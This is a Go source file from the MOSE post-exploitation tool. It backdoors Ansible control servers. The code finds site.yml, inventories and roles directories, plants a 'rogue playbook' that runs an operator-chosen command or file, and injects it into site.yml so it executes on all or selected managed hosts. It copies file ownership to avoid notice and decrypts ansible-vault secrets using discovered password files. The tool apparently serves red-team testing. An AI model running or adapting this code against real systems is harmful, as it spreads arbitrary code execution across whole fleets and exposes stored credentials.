// Copyright 2020 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.

package main

import (
	"flag"
	"fmt"
	"io"

	"os"
	"path/filepath"
	"regexp"
	"strings"
	"text/template"

	"github.com/master-of-servers/mose/pkg/moseutils"
	"github.com/master-of-servers/mose/pkg/system"

	"github.com/ghodss/yaml"
	"github.com/markbates/pkger"
	"github.com/rs/zerolog/log"
)

type command struct {
	Cmd      string
	CmdName  string
	FileName string
	FilePath string
}

type ansibleFiles struct {
	cfgFile      string
	hostFiles    []string
	hosts        []string
	playbookDirs []string
	siteFile     string
	vaultFile    string
	uid          int
	gid          int
}

type ansible []struct {
	Name         string                 `json:"name,omitempty"`
	Connection   interface{}            `json:"connection,omitempty"`
	Vars         map[string]interface{} `json:"vars,omitempty,flow"`
	Remote       string                 `json:"remote_user,omitempty"`
	BecomeMethod string                 `json:"become_method,omitempty"`
	Hosts        string                 `json:"hosts,omitempty"`
	Become       bool                   `json:"become,omitempty"`
	GatherFacts  string                 `json:"gather_facts,omitempty"`
	Include      string                 `json:"include,omitempty"`
	Tags         []interface{}          `json:"tags,omitempty,flow"`
	Roles        []interface{}          `json:"roles,flow,omitempty"`
	Tasks        []interface{}          `json:"tasks,flow,omitempty"`
}

var (
	a                = CreateAgent()
	cmd              = a.Cmd
	ansibleBackupLoc = a.AnsibleBackupLoc
	cleanup          bool
	cleanupFile      = a.CleanupFile
	debug            = a.Debug
	files            = ansibleFiles{
		cfgFile:      "",
		hostFiles:    []string{},
		playbookDirs: []string{},
		siteFile:     "",
		vaultFile:    "",
		uid:          -1,
		gid:          -1,
	}
	osTarget       = a.OsTarget
	ansibleRole    = a.PayloadName
	uploadFileName = a.FileName
	uploadFilePath = a.RemoteUploadFilePath
	specific       bool
	noColor        bool
)

func init() {
	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
	flag.BoolVar(&noColor, "d", false, "Disable color output")
	flag.Parse()
}

func doCleanup(siteLoc string) {
	moseutils.TrackChanges(cleanupFile, cleanupFile)
	ans, err := moseutils.AskUserQuestion("Would you like to remove all files associated with a previous run? ", osTarget)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}
	moseutils.RemoveTracker(cleanupFile, osTarget, ans)

	path := siteLoc
	if ansibleBackupLoc != "" {
		path = filepath.Join(ansibleBackupLoc, filepath.Base(siteLoc))
	}

	path = path + ".bak.mose"

	if !system.FileExists(path) {
		log.Info().Msgf("Backup file %s does not exist, skipping", path)
	}
	ans2 := false
	if !ans {
		ans2, err = moseutils.AskUserQuestion(fmt.Sprintf("Overwrite %s with %s", siteLoc, path), osTarget)
		if err != nil {
			log.Fatal().Msg("Quitting...")
		}
	}
	if ans || ans2 {
		system.CpFile(path, siteLoc)
		os.Remove(path)
	}
	os.Exit(0)
}

func getSiteFile() string {
	var siteLoc string
	fileList, _ := system.GetFileAndDirList([]string{"/"})
	for _, file := range fileList {
		if strings.Contains(file, "site.yml") && !strings.Contains(file, "~") &&
			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") {
			siteLoc = file
		}
	}
	if siteLoc == "" {
		log.Error().Msg("Unable to locate a site.yml file.")
	}
	return siteLoc
}

func getCfgFile() string {
	var cfgLoc string
	fileList, _ := system.GetFileAndDirList([]string{"/"})
	for _, file := range fileList {
		matched, _ := regexp.MatchString(`ansible.cfg$`, file)
		if matched && !strings.Contains(file, "~") &&
			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") &&
			!strings.Contains(file, "test") {
			cfgLoc = file
		}
	}
	if cfgLoc == "" {
		log.Error().Msg("Unable to locate an ansible.cfg file.")
	}
	return cfgLoc
}

func getPlaybooks() []string {
	locations := make(map[string]bool)
	var playbookDirs []string

	_, dirList := system.GetFileAndDirList([]string{"/"})
	for _, dir := range dirList {
		d := filepath.Dir(dir)
		if strings.Contains(d, "roles") && !strings.Contains(d, "~") &&
			!strings.Contains(d, ".bak") && !strings.Contains(d, "#") &&
			!strings.Contains(d, "tasks") && !strings.Contains(d, "vars") {

			if !locations[d] && filepath.Base(d) == "roles" {
				locations[d] = true
			}
		}
	}
	for loc := range locations {
		playbookDirs = append(playbookDirs, loc)
	}

	return playbookDirs
}

func getHostFileFromCfg() (bool, string) {
	cfgFile, err := system.File2lines(files.cfgFile)
	if err != nil {
		log.Error().Err(err).Msgf("Unable to read %v", files.cfgFile)
	}
	for _, line := range cfgFile {
		matched, _ := regexp.MatchString(`^inventory.*`, line)
		if matched {
			log.Debug().Msgf("Found inventory specified in ansible.cfg: %v", files.cfgFile)
			inventoryPath := strings.TrimSpace(strings.SplitAfter(line, "=")[1])
			path, err := system.CreateFilePath(inventoryPath, filepath.Dir(files.cfgFile))
			if err != nil {
				log.Error().Err(err).Msgf("Unable to generate correct path from input: %v %v", inventoryPath, filepath.Dir(files.cfgFile))
			}
			return true, path
		}
	}
	return false, ""
}

func getHostFiles() []string {
	var hostFiles []string

	// Check if host file specified in the ansible.cfg file
	found, hostFile := getHostFileFromCfg()
	if found {
		hostFiles = append(hostFiles, hostFile)
	}

	fileList, _ := system.GetFileAndDirList([]string{"/etc/ansible"})
	for _, file := range fileList {
		if strings.Contains(file, "hosts") && !strings.Contains(file, "~") &&
			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") {
			hostFiles = append(hostFiles, file)
		}
	}
	return hostFiles
}

func getManagedSystems() []string {
	var hosts []string
	for _, hostFile := range files.hostFiles {
		// Get the contents of the hostfile into a slice
		contents, err := system.File2lines(hostFile)
		if err != nil {
			log.Error().Err(err).Msgf("Unable to read %v", hostFile)
		}
		// Add valid lines with IP addresses or hostnames to hosts
		for _, line := range contents {
			ip, _ := regexp.MatchString(`^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$`, line)
			validHostname, _ := regexp.MatchString(`^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$`, line)
			if ip || validHostname {
				hosts = append(hosts, line)
			}
		}
	}
	return hosts
}

func createPlaybookDirs(playbookDir string, ansibleCommand command) {
	var err error
	var fileDir string
	err = os.MkdirAll(filepath.Join(playbookDir, ansibleCommand.CmdName, "tasks"), os.ModePerm)

	if err != nil {
		log.Printf("Error creating the %s playbook directory: %v", playbookDir, err)
	}

	if uploadFileName != "" {
		fileDir = filepath.Join(playbookDir, ansibleCommand.CmdName, "files")
		err = os.MkdirAll(fileDir, os.ModePerm)

		if err != nil {
			log.Printf("Error creating the %s playbook directory: %v", fileDir, err)
		}

		_, err := moseutils.TrackChanges(cleanupFile, uploadFilePath)

		if err != nil {
			log.Error().Err(err).Msg("Error tracking changes: ")
		}

		system.CpFile(uploadFilePath, filepath.Join(fileDir, filepath.Base(uploadFileName)))
		if err := os.Chmod(filepath.Join(fileDir, filepath.Base(uploadFileName)), 0644); err != nil {
			log.Printf("Failed to set the permissions for %v: %v", uploadFileName, err)
		}
		moseutils.ColorMsgf("Successfully copied and set permissions for %s", filepath.Join(fileDir, filepath.Base(uploadFileName)))
	}
}

func backupSiteFile() {
	path := files.siteFile
	// If a backup location is specified in the settings.json, use it
	if ansibleBackupLoc != "" {
		var err error
		err = os.MkdirAll(ansibleBackupLoc, os.ModePerm)

		if err != nil {
			log.Error().Msgf("Error creating the path (%s) for the backup: %v", path, err)
		}

		path = filepath.Join(ansibleBackupLoc, filepath.Base(files.siteFile))
	}
	if !system.FileExists(path + ".bak.mose") {
		system.CpFile(files.siteFile, path+".bak.mose")
		if files.uid != -1 && files.gid != -1 {
			err := os.Chown(path+".bak.mose", files.uid, files.gid)
			if err != nil {
				log.Error().Msg("issues changing owner of backup file")
			}
		}
	} else {
		log.Error().Msgf("Backup of the site.yml file already exists (%v.bak.mose), moving on.", path)
	}
}

func generatePlaybooks() {
	ansibleCommand := command{
		CmdName:  a.PayloadName,
		Cmd:      a.Cmd,
		FileName: uploadFileName,
		FilePath: uploadFilePath,
	}
	for _, playbookDir := range files.playbookDirs {
		//var s string
		createPlaybookDirs(playbookDir, ansibleCommand)

		s, err := pkger.Open("/tmpl/ansiblePlaybook.tmpl")

		if err != nil {
			log.Fatal().Err(err).Msg("Error reading the template to create a playbook: %v, exiting...")
		}

		defer s.Close()

		if uploadFileName != "" {
			s, err = pkger.Open("/tmpl/ansibleFileUploadPlaybook.tmpl")

			if err != nil {
				log.Fatal().Err(err).Msg("Error reading the file upload template to create a playbook, exiting...")
			}
			defer s.Close()
		}

		dat := new(strings.Builder)
		_, err = io.Copy(dat, s)

		if err != nil {
			log.Fatal().Err(err).Msg("")
		}

		// Parse the template
		t, err := template.New("ansiblePlaybook").Parse(dat.String())

		if err != nil {
			log.Fatal().Err(err).Msg("Error creating the template representation of the ansible playbook, exiting...")
		}

		// Create the main.yml file
		f, err := os.Create(filepath.Join(playbookDir, ansibleCommand.CmdName, "tasks", "main.yml"))

		if err != nil {
			log.Fatal().Err(err).Msg("Error creating the main.yml file: %v, exiting...")
		}

		// Write the contents of ansibleCommand into the main.yml file generated previously
		err = t.Execute(f, ansibleCommand)

		if err != nil {
			log.Fatal().Err(err).Msg("Error injecting the ansibleCommand content into the playbook template")
		}

		f.Close()
		log.Debug().Msgf("Creating rogue playbook %s", playbookDir)
		moseutils.ColorMsgf("Successfully created the %s playbook at %s", ansibleCommand.CmdName, playbookDir)

		_, err = moseutils.TrackChanges(cleanupFile, filepath.Join(playbookDir, ansibleCommand.CmdName))

		if err != nil {
			log.Error().Err(err).Msg("Error tracking changes: ")
		}

		log.Debug().Msg("Attempting to change ownership of directory")
		if files.uid != -1 && files.gid != -1 {
			err := system.ChownR(filepath.Join(playbookDir, ansibleCommand.CmdName), files.uid, files.gid)
			if err != nil {
				log.Error().Err(err).Msg("issues changing owner of backup file")
			}
		}
	}
}

func writeYamlToSite(siteYaml ansible) {
	marshalled, err := yaml.Marshal(&siteYaml)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	err = system.WriteBytesToFile(files.siteFile, marshalled, 0644)
	if err != nil {
		log.Fatal().Err(err).Msgf("Error writing %v to %v, exiting.", marshalled, files.siteFile)
	}
	moseutils.ColorMsgf("Added backdoored code to %s", files.siteFile)
}

func validateIndicies(data ansible) map[int]bool {
	validIndices := make(map[int]bool, 0)
	for i, hosts := range data {
		roles := make([]string, 0)
		if hosts.Include == "" {
			for _, item := range hosts.Roles {
				switch r := item.(type) {
				case map[string]interface{}:
					roles = append(roles, r["role"].(string))
				case string:
					roles = append(roles, r)
				default:
					log.Debug().Msg("Should not make it here in validateIndicies")
				}
			}
			moseutils.ColorMsgf("[%v] Name: %v, Hosts: %v, Roles: %v", i, hosts.Name, hosts.Hosts, roles)
			validIndices[i] = true
		}
	}
	return validIndices
}

func backdoorSiteFile() {
	var hosts []string
	hostAllFound := false

	bytes, err := system.ReadBytesFromFile(files.siteFile)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	unmarshalled := ansible{}
	err = yaml.Unmarshal(bytes, &unmarshalled)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	for _, host := range unmarshalled {
		hosts = append(hosts, host.Hosts)
		if strings.Compare(host.Hosts, "all") == 0 {
			hostAllFound = true
		}
	}

	if hostAllFound {
		log.Debug().Msg("hosts:all found")
		if ans, err := moseutils.AskUserQuestion("Would you like to target all managed hosts? ", a.OsTarget); ans && err == nil {
			for i, item := range unmarshalled {
				if strings.Compare(item.Hosts, "all") == 0 {
					log.Log().Msg("Existing configuration for all hosts found, adding rogue playbook to associated roles")
					if unmarshalled[i].Roles == nil {
						unmarshalled[i].Roles = make([]interface{}, 0)
					}
					unmarshalled[i].Roles = append(unmarshalled[i].Roles, ansibleRole)
					writeYamlToSite(unmarshalled)
					return
				}
			}
		} else if err != nil {
			log.Fatal().Msg("Quitting...")
		}
	}

	if !hostAllFound {
		log.Debug().Msgf("No existing configuration for all founds host in %v", files.siteFile)
		roles := make([]interface{}, 0)
		roles = append(roles, ansibleRole)
		if ans, err := moseutils.AskUserQuestion("Would you like to target all managed nodes? ", a.OsTarget); ans && err == nil {
			newItem := ansible{{
				a.PayloadName,
				nil,
				nil,
				"",
				"",
				"all",
				true,
				"",
				"",
				nil,
				roles,
				nil,
			}}
			unmarshalled = append(unmarshalled, newItem[0])
			writeYamlToSite(unmarshalled)
			return
		} else if err != nil {
			log.Fatal().Err(err).Msg("Error targeting all managed nodes: %v, exiting.")
		}
	}
	log.Info().Msg("The following roles were found in the site.yml file: ")
	validIndices := validateIndicies(unmarshalled)

	if ans, err := moseutils.IndexedUserQuestion("Provide the index of the location that you want to inject into the site.yml (ex. 1,3,...):", a.OsTarget, validIndices, func() { validateIndicies(unmarshalled) }); err == nil {
		for i := range unmarshalled {
			// Check if the specified location is in the answer
			if ans[i] {
				if unmarshalled[i].Roles == nil {
					unmarshalled[i].Roles = make([]interface{}, 0)
				}
				unmarshalled[i].Roles = append(unmarshalled[i].Roles, ansibleRole)
			}
		}
	} else if err != nil {
		log.Fatal().Err(err).Msg("Failure injecting into the site.yml file, exiting.")
	}
	writeYamlToSite(unmarshalled)
}

func findVaultSecrets() {
	found, fileLoc := system.FindFile("ansible-vault", []string{"/bin", "/usr/bin", "/usr/local/bin", "/etc/anisble"})
	if found {
		envPass := os.Getenv("ANSIBLE_VAULT_PASSWORD_FILE")
		envFileExists, envFile := getVaultPassFromCfg()

		ansibleFiles, _ := system.FindFiles([]string{"/etc/ansible", "/root", "/home", "/opt", "/var"}, []string{".yaml", ".yml"}, []string{"vault"}, []string{})

		if len(ansibleFiles) == 0 {
			log.Error().Msg("Unable to find any yaml files")
			return
		}
		// Matches for secrets
		reg := regexp.MustCompile(`(?ms)\$ANSIBLE_VAULT`)
		// Translate secrets on the fly
		for _, file := range ansibleFiles {
			matches := system.GrepFile(file, reg)
			log.Debug().Msgf("Checking if secret in file %v", file)
			if len(matches) > 0 {
				if envPass != "" {
					moseutils.ColorMsgf("Found secret(s) in file: %s", file)
					res, err := system.RunCommand(fileLoc, "view",
						"--vault-password-file",
						envPass,
						file)

					if err != nil {
						log.Error().Err(err).Msgf("Error running command: %s view %s %s", fileLoc, envPass, file)
					}
					if !strings.Contains(res, "ERROR!") {
						moseutils.ColorMsgf("%s", res)
					}
				}

				if envFileExists && envFile != envPass {
					moseutils.ColorMsgf("Found secret(s) in file: %s", file)
					res, err := system.RunCommand(fileLoc, "view",
						"--vault-password-file",
						envFile,
						file)

					if err != nil {
						log.Error().Err(err).Msgf("Error running command: %s view --vault-password-file %s %s", fileLoc, envFile, file)
					}
					if !strings.Contains(res, "ERROR!") {
						moseutils.ColorMsgf("%s", res)
					}
				}
			}
		}
	}
}

func getVaultPassFromCfg() (bool, string) {
	cfgFile, err := system.File2lines(files.cfgFile)
	if err != nil {
		log.Error().Err(err).Msgf("Unable to read %v", files.cfgFile)
	}
	for _, line := range cfgFile {
		matched, _ := regexp.MatchString(`^vault_password_file.*`, line)
		if matched {
			log.Debug().Msgf("Found vault_password_file specified in ansible.cfg: %v", files.cfgFile)
			vaultPath := strings.TrimSpace(strings.SplitAfter(line, "=")[1])
			path, err := system.CreateFilePath(vaultPath, filepath.Dir(files.cfgFile))
			if err != nil {
				log.Error().Err(err).Msgf("Unable to generate correct path from input: %v %v", vaultPath, filepath.Dir(files.cfgFile))
			}
			return true, path
		}
	}
	return false, ""
}

func main() {
	moseutils.NOCOLOR = noColor
	moseutils.SetupLogger(debug)

	// Find site.yml
	files.siteFile = getSiteFile()
	log.Debug().Msgf("Site file: %v", files.siteFile)

	if cleanup {
		log.Debug().Msg("Cleanup")
		doCleanup(files.siteFile)
		os.Exit(0)
	}

	if uploadFileName != "" {
		system.CpFile(uploadFileName, uploadFilePath)
		_, err := moseutils.TrackChanges(cleanupFile, uploadFileName)

		if err != nil {
			log.Error().Err(err).Msgf("Error tracking changes: ")
		}
	}

	uid, gid, err := system.GetUIDGid(files.siteFile)
	if err != nil {
		log.Error().Err(err).Msg("Error retrieving uid and gid of file, will default to root")
	}

	files.uid = uid
	files.gid = gid

	// Find ansible.cfg
	files.cfgFile = getCfgFile()
	log.Debug().Msgf("Ansible config file location: %v", files.cfgFile)

	// Find where playbooks are located on the target system
	files.playbookDirs = getPlaybooks()
	log.Debug().Msgf("Directories with playbooks: %v", files.playbookDirs)

	// Find host files
	files.hostFiles = getHostFiles()
	log.Debug().Msgf("Host files found: %v", files.hostFiles)

	// Parse managed systems from the hosts files found previously
	files.hosts = getManagedSystems()
	if len(files.hosts) > 0 {
		log.Info().Msgf("The following managed systems were found: %v", files.hosts)
	}

	if files.siteFile != "" {
		if ans, err := moseutils.AskUserQuestion("Do you want to create a backup of the manifests? This can lead to attribution, but can save your bacon if you screw something up or if you want to be able to automatically clean up. ", a.OsTarget); ans && err == nil {
			backupSiteFile()
		} else if err != nil {
			log.Fatal().Err(err).Msg("Exiting...")
		}
	}

	// Create rogue playbooks using ansiblePlaybook.tmpl
	generatePlaybooks()

	if uploadFileName != "" {
		moseutils.ColorMsgf("Backdooring %v to run %s on all managed systems, please wait...", files.siteFile, uploadFileName)
	} else {
		moseutils.ColorMsgf("Backdooring %v to run %s on all managed systems, please wait...", files.siteFile, cmd)
	}
	backdoorSiteFile()

	log.Debug().Msgf("Changing owner of the backup file to uid %v", files.uid)
	if files.uid != -1 && files.gid != -1 {
		err := os.Chown(files.siteFile, files.uid, files.gid)
		if err != nil {
			log.Error().Err(err).Msg("Failed to change owner of the backup file")
		}
	}

	// find secrets if ansible-vault is installed
	log.Log().Msg("Attempting to find secrets, please wait...")
	findVaultSecrets()
	log.Log().Msg("MOSE has finished, exiting.")
	os.Exit(0)
}
